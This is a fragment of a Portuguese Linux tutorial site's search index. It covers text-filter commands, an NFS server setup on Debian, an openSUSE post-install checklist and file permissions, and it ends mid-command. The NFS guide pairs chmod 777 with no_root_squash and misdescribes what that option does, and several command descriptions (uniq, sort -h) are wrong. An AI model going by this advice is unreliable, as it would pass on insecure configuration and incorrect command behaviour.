<code>cat</code>, <code>tac</code>, <code>head</code>, <code>tail</code>, <code>less</code>, <code>nl</code>, <code>sort</code> E <code>uniq</code>","text":""},{"location":"Modulo_103.2-aula01/#o-comando-cat","title":"O comando <code>cat</code>","text":"<pre><code>$ cat arquivo.txt\n</code></pre> <p>Com a op\u00e7\u00e3o <code>-n</code> para numera\u00e7\u00e3o de linhas:</p> <pre><code>$ cat -n arquivo.txt\n</code></pre> <p>Com a op\u00e7\u00e3o <code>-b</code>, somente linhas com informa\u00e7\u00f5es, ignorando linhas vazias:</p> <pre><code>$ cat -b arquivo.txt\n</code></pre> <p>Unifica linhas em branco em uma apenas, com a op\u00e7\u00e3o <code>-s</code>:</p> <pre><code>$ cat -s arquivo.txt\n</code></pre> <p>Com a op\u00e7\u00e3o <code>-a</code>, mostra caracteres especiais. todo fim de linha tem um <code>$</code>. todo tab ele mostra um <code>^i</code></p> <pre><code>$ cat -a arquivo.txt\n</code></pre> <p>O help tr\u00e1s ajuda:</p> <pre><code>$ cat --help\n</code></pre> <p>O man tem o manual completo:</p> <pre><code>$ man cat\n</code></pre>"},{"location":"Modulo_103.2-aula01/#filtros","title":"FILTROS","text":""},{"location":"Modulo_103.2-aula01/#o-comando-tac","title":"O COMANDO <code>tac</code>","text":"<p>O inverso de cat, imprime o arquivo de tr\u00e1s pra frente. na ordem inversa, da \u00faltima linha pra primeira:</p> <pre><code>$ tac arquivo.txt\n</code></pre>"},{"location":"Modulo_103.2-aula01/#o-comando-head","title":"O COMANDO <code>head</code>","text":"<p>Apresenta o cabe\u00e7alho do arquivo. por padr\u00e3o tr\u00e1s as primeiras 10 linhas do arquivo. (completas ou vazias):</p> <pre><code>$ head arquivo.txt\n</code></pre> <p>Posso definir a quantidade de linhas com a op\u00e7\u00e3o <code>-n</code> e mostrar apenas as 2 primeiras linhas:</p> <pre><code>$ head -n2 arquivo.txt\n</code></pre> <p>Mostrar as 20 primeiras linhas:</p> <pre><code>$ head -n20 arquivo.txt\n</code></pre> <p>Mostrar apenas os 50 primeiros bytes. (ele n\u00e3o quebra a linha no final do comando mesmo.):</p> <pre><code>$ head -c50 arquivo.txt\n</code></pre>"},{"location":"Modulo_103.2-aula01/#o-comando-tail","title":"O COMANDO <code>tail</code>","text":"<p>O comando <code>tail</code> mostra o final do arquivo. por padr\u00e3o as \u00daltimas 10 linhas.</p> <p>Posso definir a qtidade de linhas com a op\u00e7\u00e3o <code>-n</code>:</p> <pre><code>$ tail arquivo.txt\n\n$ tail -n4 arquivo\n</code></pre> <p>O tail tem uma op\u00e7\u00e3o muito interessante, que \u00e9 a <code>-f</code>, onde ele fica aguardando a entrada de informa\u00c7\u00d5es em um arquivo. muito usada pra monitorar eventos.</p> <p>Exemplo, em um terminal vc fica escutando:</p> <pre><code>$ tail -n5 -f arquivo.txt\n</code></pre> <p>E em outro terminal digita:</p> <pre><code>$ echo \u201clinus torvaldis\u201d &gt;&gt; arquivo.txt\n</code></pre> <p>Outro exemplo:</p> <pre><code>$ tail -f /var/log/zypper\n</code></pre> <p>Abre outro terminal e digita:</p> <pre><code>$ sudo zypper dup\n</code></pre> <p>Vai mostrar a evolu\u00e7\u00e3o do processo de atualiza\u00e7\u00e3o no OpenSUSE.</p> <p>Podemos validar a entrada e sa\u00edda de acesso a p\u00e1ginas web de um proxy, por exemplo. ou acompanhar qualquer log em tempo real que precisarmos!</p>"},{"location":"Modulo_103.2-aula01/#o-comando-less","title":"O COMANDO <code>less</code>","text":"<p>Usando o ambiente gr\u00e1fico, vc pode usar a barra de rolagem pra leitura de arquivos no terminal, mas em ambientes modo texto, nem sempre vc tem essa op\u00e7\u00e3o.</p> <p>Ent\u00e3o podemos paginar a leitura de um arquivo. ele vai travar a leitura em casa vez que alcan\u00e7ar a linha de baixo (ou de cima), navegando pelo direcional do teclado ou pelo enter. vai travar na pr\u00f3xima p\u00e1gina usando o <code>tab</code>:</p> <pre><code>$ less arquivo.txt\n</code></pre> <p>Uma vez aberto , o less possibilita busca por palavras, com o atalho da <code>/</code> + a palavra que procuramos:</p> <pre><code>/kernel enter\n</code></pre> <p>Cada vez que aperto <code>n</code>, ele busca uma nova op\u00e7\u00e3o, dessa mesma palavra, em outras p\u00e1ginas.</p> <p>Com <code>shift</code> + <code>n</code> ele busca para tr\u00e1s.</p> <p>Se selecionar <code>ctrl</code> + <code>g</code>, ele mostra o status de onde estou no arquivo, nome, p\u00e1gina atual e percentual da leitura.</p> <p>Pressionado <code>q</code>, vc sai do <code>less</code>.</p> <p>O <code>less</code>, geralmente, \u00e9 usado em associa\u00e7\u00e3o com o <code>cat</code> + o <code>|</code>:</p> <pre><code>$ cat arquivo.txt | less\n</code></pre> <p>O pipe pega a sa\u00edda do primeiro comando e usa de entrada do segundo comando.</p>"},{"location":"Modulo_103.2-aula01/#o-comando-wc","title":"O COMANDO <code>wc</code>","text":"<p>o comando <code>wc</code>, imprime na tela, a quantidade de linhas, a quantidade de palavras e a quantidade de caracteres, desse arquivo:</p> <pre><code>$ wc arquivo.txt\n</code></pre> <p>Se usar a op\u00e7\u00e3o <code>-l</code>, mostra apenas as linhas.</p> <p>Se usar a op\u00e7\u00e3o <code>-w</code>, ele mostra as palavras.</p> <p>Se usar <code>-m</code> ele mostra de caracteres.</p> <p>A op\u00e7\u00e3o <code>-c</code> aponta a quantidade de bytes.</p> <p>Se vc der um <code>wc *</code> dentro de um diret\u00f3rio, ele vai apresentar dados sobre a quantidade de linhas, palavras e caracteres de todos os arquivos que estiverem dentro do diret\u00f3rio. trazendo o total no final.</p> <p>Podemos fazer combina\u00e7\u00f5es, tipo de <code>cat</code> + <code>|</code> + <code>wc</code>:</p> <pre><code>$ cat arquivo.txt | wc -l\n</code></pre> <p>ou <code>tail</code> + <code>|</code> + <code>wc</code>:</p> <pre><code>$ tail -n10 arquivo.txt | wc\n</code></pre>"},{"location":"Modulo_103.2-aula01/#o-comando-nl","title":"O COMANDO <code>nl</code>","text":"<p>O <code>nl</code> \u00e9 igual ao <code>cat -b</code>, ignorando linhas em branco:</p> <pre><code>$ nl arquivo.txt\n</code></pre>"},{"location":"Modulo_103.2-aula01/#o-comando-sort","title":"O COMANDO <code>sort</code>","text":"<p>O <code>sort</code> serve pra ordenar alfab\u00e9ticamente um arquivo.</p> <p>Se usar a op\u00e7\u00e3o <code>-r</code>, ele ordena reversamente, ao contr\u00e1rio do alfabeto.</p> <p>As demais op\u00e7\u00f5es do sort, podem ser estudadas com <code>sort -h</code>.</p>"},{"location":"Modulo_103.2-aula01/#o-comando-uniq","title":"O COMANDO <code>uniq</code>","text":"<p>O <code>uniq</code> serve pra mostrar entradas \u00fanicas dentro de um arquivo com repeti\u00e7\u00f5es, ou seja, ele mostra ocorr\u00eancias \u00fanicas, sem as repeti\u00e7\u00f5es que possam ocorrer no arquivo:</p> <pre><code>$ unique arquivo.txt\n</code></pre> <p>Se houverem dois eventos de \u201clinux\u201d, ele tr\u00e1s apenas um deles.</p> <p>Se usar com a op\u00e7\u00e3o<code>-k</code>, ele ordena pelo segundo campo, tipo nome e sobrenome, ele ordenaria alfab\u00e9ticamente o sobrenome.</p> <p>THAT\u2019S ALL FOLKS!!</p>"},{"location":"NFS_Server/","title":"\ud83d\udcc1 NFS Server no Debian Linux","text":"<p>O NFS (Network File System) permite que sistemas Linux compartilhem diret\u00f3rios e arquivos pela rede, como se estivessem em um mesmo disco local. Neste tutorial, voc\u00ea aprender\u00e1 a configurar um servidor NFS no Debian Linux e montar os compartilhamentos em clientes.</p>"},{"location":"NFS_Server/#1-pre-requisitos","title":"\ud83d\udda5\ufe0f 1. Pr\u00e9-requisitos","text":"<ul> <li>Um servidor rodando Linux</li> <li>Acesso root ou permiss\u00f5es <code>sudo</code></li> <li>Um ou mais clientes Linux (tamb\u00e9m pode ser Debian, Ubuntu, CentOS, etc.)</li> </ul>"},{"location":"NFS_Server/#2-instalando-o-servidor-nfs","title":"\ud83d\udce6 2. Instalando o Servidor NFS","text":"<p>No servidor:</p> <pre><code>sudo apt update\nsudo apt install nfs-kernel-server -y\n</code></pre>"},{"location":"NFS_Server/#3-criando-diretorio-para-compartilhamento","title":"\ud83d\udcc2 3. Criando Diret\u00f3rio para Compartilhamento","text":"<p>Crie a pasta que ser\u00e1 compartilhada:</p> <pre><code>sudo mkdir -p /srv/nfs/&lt;minha-pasta&gt;\n</code></pre> <p>Defina as permiss\u00f5es (exemplo: acesso leitura/escrita para todos os clientes da rede):</p> <pre><code>sudo chown -R nobody:nogroup /srv/nfs/&lt;minha-pasta&gt;\nsudo chmod -R 777 /srv/nfs/&lt;minha-pasta&gt;\n</code></pre> <p>Valide as permiss\u00f5es:</p>"},{"location":"NFS_Server/#sudo-ls-l-srvnfsminha-pasta","title":"<pre><code>sudo ls -l /srv/nfs/&lt;minha-pasta&gt;\n</code></pre>","text":""},{"location":"NFS_Server/#4-configurando-o-arquivo-de-exportacao-para-a-rede-ter-acesso-a-sua-pasta","title":"\u2699\ufe0f 4. Configurando o Arquivo de <code>EXPORTA\u00c7\u00c3O</code> para a rede ter acesso \u00e1 SUA pasta.","text":"<p>Edite o arquivo <code>/etc/exports</code>:</p> <pre><code>sudo vim /etc/exports\n</code></pre> <p>Adicione uma linha especificando o diret\u00f3rio e as permiss\u00f5es. Exemplo (compartilhar para toda a rede local <code>192.168.0.0/24</code>):</p> <pre><code>/srv/nfs/&lt;minha-pasta&gt; 192.168.0.0/24(rw,sync,no_subtree_check,no_root_squash)\n</code></pre> <p>Par\u00e2metros principais:</p> <ul> <li><code>rw</code> \u2192 leitura e escrita</li> <li><code>sync</code> \u2192 grava dados imediatamente no disco (mais seguro)</li> <li><code>no_subtree_check</code> \u2192 melhora desempenho em subdiret\u00f3rios</li> <li><code>no_root_squash</code> \u2192 Permite acesso sem o usu\u00e1rio root</li> </ul> <p>Ap\u00f3s salvar, aplique as configura\u00e7\u00f5es:</p> <pre><code>sudo exportfs -ra\n</code></pre>"},{"location":"NFS_Server/#5-iniciando-e-habilitando-o-servico","title":"\u25b6\ufe0f 5. Iniciando e Habilitando o Servi\u00e7o","text":"<pre><code>sudo systemctl enable nfs-server\nsudo systemctl start nfs-server\nsudo systemctl status nfs-server\n</code></pre>"},{"location":"NFS_Server/#7-configurando-o-cliente-nfs","title":"\ud83d\udcbb 7. Configurando o Cliente NFS","text":"<p>No cliente (exemplo: outro Debian/Ubuntu):</p>"},{"location":"NFS_Server/#71-instale-o-cliente-nfs","title":"7.1 Instale o cliente NFS","text":"<pre><code>sudo apt install nfs-common -y\n</code></pre>"},{"location":"NFS_Server/#72-crie-um-ponto-de-montagem","title":"7.2 Crie um ponto de montagem","text":"<pre><code>sudo mkdir -p /mnt/nfs/compartilhado\n</code></pre>"},{"location":"NFS_Server/#73-monte-manualmente-o-compartilhamento","title":"7.3 Monte manualmente o compartilhamento","text":"<pre><code>sudo mount &lt;ip-do-amigo&gt;:/srv/nfs/&lt;path-do-amigo  /mnt/nfs/compartilhado\n</code></pre> <p>(Substitua <code>&lt;ip-do-amigo&gt;</code> pelo ip do Servidor NFS Remoto)</p> <p>Verifique com:</p> <pre><code>df -h | grep nfs\n</code></pre>"},{"location":"NFS_Server/#74-montagem-automatica-no-boot-substitua-com-o-ip-do-servidor-nfs-remoto","title":"7.4 Montagem autom\u00e1tica no boot (substitua com o ip do Servidor NFS Remoto)","text":"<p>Edite o arquivo <code>/etc/fstab</code> e adicione:</p> <pre><code>&lt;ip-do-amigo&gt;:/srv/nfs/&lt;pasta-do-amigo&gt; /mnt/nfs/compartilhado nfs defaults 0 0\n</code></pre>"},{"location":"NFS_Server/#8-testando-a-configuracao","title":"\ud83d\udee0\ufe0f 8. Testando a Configura\u00e7\u00e3o","text":"<p>No cliente:</p> <pre><code>touch /mnt/nfs/compartilhado/teste.txt\n</code></pre> <p>Verifique no servidor:</p> <pre><code>ls -l /srv/nfs/compartilhado/\n</code></pre> <p>Se o arquivo aparecer, o compartilhamento est\u00e1 funcionando corretamente.</p> <p>Para desmontar, use o comando:</p> <pre><code>sudo umount /mnt/nfs/compartilhado \n</code></pre>"},{"location":"NFS_Server/#conclusao","title":"\u2705 Conclus\u00e3o","text":"<p>Agora voc\u00ea tem um servidor NFS configurado no Debian Linux, com compartilhamento acess\u00edvel a clientes da rede. Esse m\u00e9todo \u00e9 \u00fatil para armazenamento centralizado, clusters de servidores e ambientes de virtualiza\u00e7\u00e3o.</p> <p>That's all Folks!</p>"},{"location":"OpenSUSE/","title":"OpenSUSE TW P\u00f3s instala\u00e7\u00e3o:","text":""},{"location":"OpenSUSE/#atualiza-a-distibuicao","title":"Atualiza a distibui\u00e7\u00e3o","text":"<pre><code>sudo zypper ref &amp;&amp; sudo zypper dup\n</code></pre>"},{"location":"OpenSUSE/#alterando-o-valor-da-swappiness","title":"Alterando o valor da swappiness","text":"<pre><code>sudo nano /etc/sysctl.conf\n</code></pre> <pre><code>vm.swappiness=10\n</code></pre>"},{"location":"OpenSUSE/#adicionando-o-repositorio-packman-codecs-non-free","title":"Adicionando o Reposit\u00f3rio Packman (codecs non-free)","text":"<pre><code>sudo zypper addrepo -cfp 90 'https://ftp.gwdg.de/pub/linux/misc/packman/suse/openSUSE_Tumbleweed/' packman\n</code></pre>"},{"location":"OpenSUSE/#importando-a-chave-da-assinatura-gpg-do-repositorio","title":"Importando a chave da assinatura GPG do reposit\u00f3rio","text":"<pre><code>sudo zypper --gpg-auto-import-keys ref\n</code></pre>"},{"location":"OpenSUSE/#atualizacao-no-sistema-a-partir-do-repositorio-packman","title":"Atualiza\u00e7\u00e3o no sistema a partir do reposit\u00f3rio Packman","text":"<pre><code>sudo zypper dist-upgrade --from packman --allow-vendor-change\n</code></pre>"},{"location":"OpenSUSE/#instalando-os-codecs-no-opensuse-tumbleweed","title":"Instalando os codecs no openSUSE Tumbleweed","text":"<pre><code>sudo zypper install --from packman ffmpeg gstreamer-plugins-{good,bad,ugly,libav} libavcodec\n</code></pre>"},{"location":"OpenSUSE/#adicionando-o-repositorio-flathub-flatpak","title":"Adicionando o reposit\u00f3rio Flathub (Flatpak)","text":"<pre><code>sudo zypper in flatpak\n</code></pre> <pre><code>flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo\n</code></pre>"},{"location":"OpenSUSE/#instalando-a-maquina-virtual-java","title":"Instalando a m\u00e1quina virtual JAVA","text":"<pre><code>sudo zypper in java-24-openjdk\n</code></pre>"},{"location":"OpenSUSE/#suporte-para-extracao-e-compactacao-de-arquivos","title":"Suporte para extra\u00e7\u00e3o e compacta\u00e7\u00e3o de arquivos","text":"<pre><code>sudo zypper in bzip2 cabextract lhasa lzip 7zip rar unrar unzip zip\n</code></pre>"},{"location":"OpenSUSE/#baixar-torrents","title":"Baixar torrents","text":"<pre><code>sudo zypper in qbittorrent\n</code></pre>"},{"location":"OpenSUSE/#player-vlc","title":"Player VLC","text":"<pre><code>sudo zypper in --from packman vlc vlc-codecs\n</code></pre>"},{"location":"OpenSUSE/#edicao-de-video","title":"Edi\u00e7\u00e3o de v\u00eddeo","text":"<pre><code>sudo zypper in --from packman kdenlive\n</code></pre>"},{"location":"OpenSUSE/#gravacao-de-tela","title":"Grava\u00e7\u00e3o de tela","text":"<pre><code>sudo zypper in --from packman obs-studio\n</code></pre>"},{"location":"OpenSUSE/#cliente-de-email","title":"Cliente de email","text":"<pre><code>sudo zypper in thunderbird\n</code></pre>"},{"location":"OpenSUSE/#cliente-de-chat","title":"Cliente de chat","text":"<pre><code>flatpak install discord\n</code></pre> <pre><code>flatpak install telegram\n</code></pre>"},{"location":"OpenSUSE/#ferramentas-para-gerenciamento-de-banco-de-dados","title":"Ferramentas para gerenciamento de Banco de dados","text":"<pre><code>flatpak install dbeaver\n</code></pre> <pre><code>flatpak install pgadmin4\n</code></pre>"},{"location":"OpenSUSE/#navegadores","title":"Navegadores","text":"<pre><code>flatpak install chrome\n</code></pre> <pre><code>flatpak install edge\n</code></pre>"},{"location":"OpenSUSE/#ferramenta-de-acesso-remoto","title":"Ferramenta de acesso remoto","text":"<pre><code>flatpak install rustdesk\n</code></pre>"},{"location":"OpenSUSE/#gerenciamento-de-discos","title":"Gerenciamento de discos","text":"<pre><code>sudo zypper in gparted\n</code></pre>"},{"location":"OpenSUSE/#instalando-o-virtualbox","title":"Instalando o Virtualbox","text":"<pre><code>sudo zypper in virtualbox virtualbox-guest-tools\n</code></pre> <pre><code>sudo gpasswd -a $USER vboxusers\n</code></pre>"},{"location":"OpenSUSE/#gnome","title":"Gnome","text":"<p>Instale o Gerenciador de Extens\u00f5es, pelo \"Programas\" e busque pela extens\u00e3o \"dash2doc animated\"</p>"},{"location":"OpenSUSE/#mkdocs-server","title":"MKDocs Server","text":"<pre><code>sudo zypper install python313-pipx\n</code></pre> <pre><code>sudo pipx install mkdocs\n</code></pre> <pre><code>sudo mkdocs --version\n</code></pre> <pre><code>sudo mkdocs new mkdocs\n</code></pre> <pre><code>sudo mkdocs build\n</code></pre> <pre><code>mkdocs serve -a localhost\n</code></pre>"},{"location":"Permissoes_Linux-01/","title":"\ud83d\udcc1 Tutorial de Permiss\u00f5es de Arquivos e Diret\u00f3rios no Linux","text":"<p>Aprenda a visualizar, modificar e entender o sistema de permiss\u00f5es no Linux utilizando comandos como <code>chmod</code>, <code>chown</code> e <code>chgrp</code>.</p>"},{"location":"Permissoes_Linux-01/#introducao","title":"\ud83d\udd0d Introdu\u00e7\u00e3o","text":"<p>O sistema de permiss\u00f5es do Linux \u00e9 fundamental para garantir a seguran\u00e7a e organiza\u00e7\u00e3o do sistema. Cada arquivo ou diret\u00f3rio possui regras que definem quem pode ler (r), escrever (w) e executar (x).</p>"},{"location":"Permissoes_Linux-01/#entendendo-as-permissoes","title":"\ud83d\udcd1 Entendendo as Permiss\u00f5es","text":"<p>Execute:</p> <pre><code>ls -l\n</code></pre> <p>Exemplo de sa\u00edda:</p> <pre><code>-rwxr-xr-- 1 user grupo 1234 jul 28 10:00 script.sh\n</code></pre> <p>Explicando os campos:</p> Campo Significado <code>-</code> Tipo de arquivo (<code>-</code> arquivo, <code>d</code> diret\u00f3rio) <code>rwx</code> Permiss\u00f5es do dono <code>r-x</code> Permiss\u00f5es do grupo <code>r--</code> Permiss\u00f5es de outros (p\u00fablico) <code>1</code> N\u00famero de links <code>user</code> Dono do arquivo <code>grupo</code> Grupo do arquivo <code>1234</code> Tamanho em bytes <code>jul 28 10:00</code> Data de modifica\u00e7\u00e3o <code>script.sh</code> Nome do arquivo"},{"location":"Permissoes_Linux-01/#modificando-permissoes-chmod","title":"\ud83d\udd27 Modificando Permiss\u00f5es: <code>chmod</code>","text":""},{"location":"Permissoes_Linux-01/#modo-numerico","title":"\ud83e\uddee Modo Num\u00e9rico","text":"<p>As permiss\u00f5es s\u00e3o representadas por n\u00fameros:</p> Permiss\u00e3o Valor <code>r</code> (read) 4 <code>w</code> (write) 2 <code>x</code> (execute) 1 <p>Exemplo:</p> <pre><code>chmod 754 script.sh\n</code></pre> <p>Isso define:</p> <ul> <li>Dono: <code>7</code> = <code>rwx</code></li> <li>Grupo: <code>5</code> = <code>r-x</code></li> <li>Outros: <code>4</code> = <code>r--</code></li> </ul>"},{"location":"Permissoes_Linux-01/#modo-simbolico","title":"\ud83d\udd24 Modo Simb\u00f3lico","text":"<pre><code>chmod u+x script.sh\n</code></pre> <p>Adiciona permiss\u00e3o de execu\u00e7\u00e3o para o usu\u00e1rio (u).</p> <p>Outros s\u00edmbolos:</p> S\u00edmbolo Descri\u00e7\u00e3o <code>u</code> Usu\u00e1rio (owner) <code>g</code> Grupo <code>o</code> Outros <code>a</code> Todos <code>+</code> Adiciona permiss\u00e3o <code>-</code> Remove permiss\u00e3o <code>=</code> Define exatamente essas permiss\u00f5es <p>Exemplos:</p> <pre><code>chmod g-w arquivo.txt     # Remove escrita do grupo\nchmod o=r arquivo.txt     # Outros s\u00f3 podem ler\nchmod a+x script.sh       # Todos ganham permiss\u00e3o de execu\u00e7\u00e3o\n</code></pre>"},{"location":"Permissoes_Linux-01/#mudando-dono-e-grupo-chown-e-chgrp","title":"\ud83d\udc64 Mudando Dono e Grupo: <code>chown</code> e <code>chgrp</code>","text":""},{"location":"Permissoes_Linux-01/#chown-altera-o-dono-eou-grupo","title":"<code>chown</code> \u2013 Altera o dono e/ou grupo","text":"<pre><code>chown novo_dono arquivo.txt\nchown novo_dono:novo_grupo arquivo.txt\n</code></pre>"},{"location":"Permissoes_Linux-01/#chgrp-altera-apenas-o-grupo","title":"<code>chgrp</code> \u2013 Altera apenas o grupo","text":"<pre><code>chgrp novo_grupo arquivo.txt\n</code></pre> <p>Exemplo:</p> <pre><code>chown joao:desenvolvedores projeto/\n</code></pre>"},{"location":"Permissoes_Linux-01/#permissoes-em-diretorios","title":"\ud83d\udcc1 Permiss\u00f5es em Diret\u00f3rios","text":"<p>As permiss\u00f5es t\u00eam efeitos diferentes:</p> Permiss\u00e3o Significado no diret\u00f3rio <code>r</code> Listar arquivos (<code>ls</code>) <code>w</code> Criar/apagar arquivos <code>x</code> Acessar arquivos no diret\u00f3rio"},{"location":"Permissoes_Linux-01/#permissoes-recursivas","title":"\ud83d\udd04 Permiss\u00f5es Recursivas","text":"<pre><code>chmod -R 755 pasta/\nchown -R user:grupo pasta/\n</code></pre>"},{"location":"Permissoes_Linux-01/#permissoes-especiais","title":"\ud83d\udccc Permiss\u00f5es Especiais","text":""},{"location":"Permissoes_Linux-01/#setuid-s","title":"\ud83d\udd12 <code>setuid</code> (S)","text":"<p>Permite que o programa execute com permiss\u00f5es do dono.</p> <pre><code>chmod u+s arquivo\n</code></pre>"},{"location":"Permissoes_Linux-01/#setgid-s","title":"\ud83d\udd12 <code>setgid</code> (S)","text":"<p>Arquivos criados no diret\u00f3rio herdam o grupo.</p> <pre><code>chmod g+s pasta\n</code></pre>"},{"location":"Permissoes_Linux-01/#sticky-bit-t","title":"\ud83d\udd12 Sticky bit (t)","text":"<p>Em diret\u00f3rios p\u00fablicos, evita que usu\u00e1rios deletem arquivos de outros.</p> <pre><code>chmod +t /tmp\n</code></pre>"},{"location":"Permissoes_Linux-01/#exemplos-praticos","title":"\ud83e\uddea Exemplos Pr\u00e1ticos","text":""},{"location":"Permissoes_Linux-01/#1-tornar-um-script-executavel-apenas-para-o-dono","title":"1. Tornar um script execut\u00e1vel apenas para o dono:","text":"<pre><code>chmod 700 script.sh\n</code></pre>"},{"location":"Permissoes_Linux-01/#2-permitir-que-todos-leiam-um-arquivo-mas-apenas-o-dono-possa-editar","title":"2. Permitir que todos leiam um arquivo, mas apenas o dono possa editar:","text":"<pre><code>chmod 644 documento.txt\n</code></pre>"},{"location":"Permissoes_Linux-01/#3-definir-uma-pasta-compartilhada-por-um-grupo","title":"3. Definir uma pasta compartilhada por um grupo:","text":"<pre><code>chgrp grupo pasta/\nchmod 2770 pasta/\n</code></pre>"},{"location":"Permissoes_Linux-01/#verificando-permissoes","title":"\u2705 Verificando Permiss\u00f5es","text":"<pre><code>stat arquivo.txt\n</code></pre>"},{"location":"Permissoes_Linux-01/#atencao","title":"\ud83d\uded1 Aten\u00e7\u00e3o","text":"<ul> <li>Cuidado com <code>chmod 777</code> \u2014 permite tudo para todos, o que representa risco de seguran\u00e7a.</li> <li>Modifique permiss\u00f5es com consci\u00eancia, especialmente em ambientes multiusu\u00e1rio ou servidores.</li> </ul>"},{"location":"Permissoes_Linux-01/#referencias","title":"\ud83d\udcda Refer\u00eancias","text":"<ul> <li><code>man chmod</code></li> <li><code>man chown</code></li> <li><code>man chgrp</code></li> <li>The Linux Documentation Project</li> </ul>"},{"location":"Permissoes_Linux-02/","title":"\ud83d\udcc1 Tutorial de Permiss\u00f5es de Arquivos e Diret\u00f3rios no Linux - Fixa\u00e7\u00e3o ...","text":""},{"location":"Permissoes_Linux-02/#permissoes-tratam-de-criacaoacesso-a-arquivosdiretorios-sem-elas-o-usuario-nao-pode-acessar-excluir-ou-executar-nada-relativo-a-arquivos-ou-diretorios","title":"PERMISS\u00d5ES TRATAM DE CRIA\u00c7\u00c3O/ACESSO \u00c1 ARQUIVOS/DIRET\u00d3RIOS. SEM ELAS, O USU\u00c1RIO N\u00c3O PODE ACESSAR, EXCLUIR OU EXECUTAR NADA RELATIVO \u00c1 ARQUIVOS OU DIRET\u00d3RIOS.","text":""},{"location":"Permissoes_Linux-02/#observe-as-permissoes-de-seus-arquivos-e-diretorios-com-o-comando-ls-l","title":"OBSERVE AS PERMISS\u00d5ES DE SEUS ARQUIVOS E DIRET\u00d3RIOS COM O COMANDO ls -l:","text":"<pre><code>$ cd ~\n</code></pre> <pre><code>$ ls -l\n</code></pre>"},{"location":"Permissoes_Linux-02/#sendo-que","title":"SENDO QUE:","text":""},{"location":"Permissoes_Linux-02/#dono-quem-criou-o-arquivodiretorio","title":"DONO =&gt; QUEM CRIOU O ARQUIVO/DIRET\u00d3RIO","text":""},{"location":"Permissoes_Linux-02/#grupo-permite-que-outros-usuarios-tenham-permissoes-no-arquivodiretorio","title":"GRUPO =&gt; PERMITE QUE OUTROS USU\u00c1RIOS TENHAM PERMISS\u00d5ES NO ARQUIVO/DIRET\u00d3RIO","text":""},{"location":"Permissoes_Linux-02/#outros-usuarios-que-nao-sao-donos-nem-pertencem-a-grupos-com-acessopermissoes","title":"OUTROS =&gt; USU\u00c1RIOS QUE N\u00c3O S\u00c3O DONOS NEM PERTENCEM A GRUPOS COM ACESSO/PERMISS\u00d5ES","text":""},{"location":"Permissoes_Linux-02/#os-tipos-de-permissoes-e-seus-significados-com-relacao-a-arquivos-e-tbem-com-relacao-a-diretorios","title":"OS TIPOS DE PERMISS\u00d5ES E SEUS SIGNIFICADOS, COM RELA\u00c7\u00c3O \u00c1 ARQUIVOS E TB\u00c9M COM RELA\u00c7\u00c3O \u00c1 DIRET\u00d3RIOS:","text":"<pre><code>r =&gt; significa permiss\u00e3o de leitura/acesso (read);\nw =&gt; significa permiss\u00e3o de grava\u00e7\u00e3o (write);\nx =&gt; significa permiss\u00e3o de execu\u00e7\u00e3o/acesso (execution);\n- =&gt; significa permiss\u00e3o desabilitada.\n</code></pre> <pre><code>--- =&gt; nenhuma permiss\u00e3o;\nr-- =&gt; permiss\u00e3o de leitura;\nr-x =&gt; leitura e execu\u00e7\u00e3o;\nrw- =&gt; leitura e grava\u00e7\u00e3o;\nrwx =&gt; leitura, grava\u00e7\u00e3o e execu\u00e7\u00e3o.\n</code></pre>"},{"location":"Permissoes_Linux-02/#os-comandos-chmod-e-chown","title":"OS COMANDOS chmod E chown","text":""},{"location":"Permissoes_Linux-02/#a-alteracao-de-permissoes-se-da-com-os-comandos-chmod-e-chown-sendo-que-chmod-muda-a-permissao-de-leituragravacaoexecucao-eqto-o-chown-modifica-o-usuariogrupo-proprietario-do-arquivodiretorio","title":"A ALTERA\u00c7\u00c3O DE PERMISS\u00d5ES SE D\u00c1 COM OS COMANDOS chmod E chown. SENDO QUE chmod MUDA A PERMISS\u00c3O DE LEITURA/GRAVA\u00c7\u00c3O/EXECU\u00c7\u00c3O, EQTO O chown MODIFICA O USU\u00c1RIO/GRUPO PROPRIET\u00c1RIO DO ARQUIVO/DIRET\u00d3RIO.","text":""},{"location":"Permissoes_Linux-02/#entao-temos-permissoes-por-proprietario-grupo-e-outros-divididos-por","title":"ENT\u00c3O, TEMOS PERMISS\u00d5ES POR PROPRIET\u00c1RIO, GRUPO E OUTROS, DIVIDIDOS POR:","text":"<pre><code>DONO  GRUPO  OUTROS\nrwx   r-x    r-x\n</code></pre>"},{"location":"Permissoes_Linux-02/#o-linux-valida-se-o-usuario-e-o-dono-do-arquivodiretorio-e-aplica-as-permissoes-de-dono-depois-ele-valida-se-o-grupo-pertence-aos-que-tem-acesso-ao-arquivodiretorio-e-depois-aplica-as-permissoes-de-grupo-caso-nao-seja-dono-e-nem-pertenca-aos-grupos-com-politicas-de-acesso-o-sistema-valida-as-permissoes-do-grupo-outros","title":"O LINUX VALIDA SE O USU\u00c1RIO \u00c9 O DONO DO ARQUIVO/DIRET\u00d3RIO, E APLICA AS PERMISS\u00d5ES DE DONO, DEPOIS ELE VALIDA SE O GRUPO PERTENCE AOS QUE TEM ACESSO AO ARQUIVO/DIRET\u00d3RIO, E DEPOIS APLICA AS PERMISS\u00d5ES DE GRUPO, CASO N\u00c3O SEJA DONO E NEM PERTEN\u00c7A AOS GRUPOS COM POL\u00cdTICAS DE ACESSO, O SISTEMA VALIDA AS PERMISS\u00d5ES DO GRUPO 'OUTROS'.","text":""},{"location":"Permissoes_Linux-02/#modificando-permissoes-de-arquivosdiretorios-com-o-comando-chmod","title":"MODIFICANDO PERMISS\u00d5ES DE ARQUIVOS/DIRET\u00d3RIOS COM O COMANDO chmod:","text":"<pre><code>chmod [op\u00e7\u00f5es] [permiss\u00f5es] [arquivo/diret\u00f3rio]\n</code></pre>"},{"location":"Permissoes_Linux-02/#o-linux-entende-as-letras-iniciais-u-g-e-o-como-usuario-grupo-e-outros-para-setar-as-permissoes-com-adicao-do-simbolo-de-para-adicionar-e-do-simbolo-de-para-remover-permissao","title":"O LINUX ENTENDE AS LETRAS INICIAIS u, g E o, como usuario, grupo E outros para setar as permiss\u00f5es, com adi\u00e7\u00e3o do s\u00edmbolo de '+' para adicionar e do s\u00edmbolo de '-' para remover permiss\u00e3o.","text":""},{"location":"Permissoes_Linux-02/#para-dar-permissao-de-execucao-a-um-script-para-o-usuario-logado-usamos-a-combinacao","title":"PARA DAR PERMISS\u00c3O DE EXECU\u00c7\u00c3O A UM SCRIPT, PARA O USU\u00c1RIO LOGADO, USAMOS A COMBINA\u00c7\u00c3O:","text":"<pre><code>$ chmod +x /home/snarl/aplicativo.sh\n$ ls 